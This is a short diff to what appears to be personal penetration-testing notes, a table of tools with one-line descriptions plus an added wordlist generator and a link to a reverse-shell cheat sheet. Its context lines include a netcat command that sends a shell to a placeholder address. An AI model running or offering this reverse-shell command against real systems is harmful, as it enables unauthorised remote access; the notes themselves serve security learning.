@@ -26,3 +26,12 @@ urlsnarf                  | captures HTTP requests
 nc -e /bin/sh <ip> <port> | sends a shell to the ip
 nikto                     | web vulnrability checker
 dirb                      | web brute forcer
+crunch                    |  wordlist generator
+
+
+
+
+
+
+useful links:
+[reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
